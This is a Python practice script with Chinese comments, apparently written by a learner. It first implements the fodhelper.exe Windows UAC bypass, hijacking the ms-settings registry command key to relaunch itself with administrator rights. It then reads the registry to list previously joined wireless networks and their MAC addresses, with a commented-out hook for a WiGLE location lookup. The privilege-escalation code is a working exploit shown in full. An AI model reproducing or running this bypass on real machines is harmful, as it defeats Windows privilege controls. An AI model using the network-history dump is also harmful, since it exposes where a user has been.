#!/usr/bin/python

import sys              # 系统
import time             # 时间
import winreg
import os               # 系统
#--------------------------------------------------	
StrLine = "--------------------"
LineNum = 1
#--------------------------------------------------	
import winreg as winreg
import ctypes
print (StrLine,LineNum,"-非优雅的获取管理员权限(不好使)")
LineNum+=1

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "python"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)                
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)        
        winreg.CloseKey(registry_key)
    except WindowsError:        
        raise
def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise
def execute():        
    if not is_admin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:                
            current_dir = __file__
            cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
            bypass_uac(cmd)                
            os.system(FOD_HELPER)                
            sys.exit(0)                
        except WindowsError:
            sys.exit(1)
    else:
        #这里添加我们需要管理员权限的代码
        print('[+] The script is running with administrative privileges!')      
execute()

#--------------------------------------------------	
print (StrLine,LineNum,"-访问windows注册表,获取连接过得无线网络及它们的MAC")
LineNum+=1


# from _winreg import *
def val2addr(val):
    addr = ''
    for ch in val:
        addr += '%02x ' % ord(ch)
    addr = addr.strip(' ').replace(' ', ':')[0:17]
    return addr
# def printNets(username, password):
def printNets():
    net="SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged"
    # 获取改键的所有键值
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, net)
    print ('\n[*] Networks You have Joined.')
    # 无法获取键值个数,只能遍历
    for i in range(1,100):
        try:
                print (i)
                # 获取子键
                guid = winreg.EnumKey(key, i)
                # 打开子键
                netKey = winreg.OpenKey(key, str(guid))
                # 获取键值
                (n, addr, t) = winreg.EnumValue(netKey, 5)
                # 获取键值
                (n, name, t) = winreg.EnumValue(netKey, 4)
                # 字符串转MAC地址
                # macAddr = val2addr(addr)
                macAddr = "%02x:%02x:%02x:%02x:%02x:%02x" % (addr[0],addr[1],addr[2],addr[3],addr[4],addr[5])
                # 打印
                netName = str(name)
                print ('[+] ' + netName + '  ' + macAddr)
                # ???不知道用处
                # winreg.wiglePrint(username, password, macAddr)
                # 关闭子键
                winreg.CloseKey(netKey)
        except:
                break
printNets()
#--------------------------------------------------
sys.exit()
#--------------------------------------------------

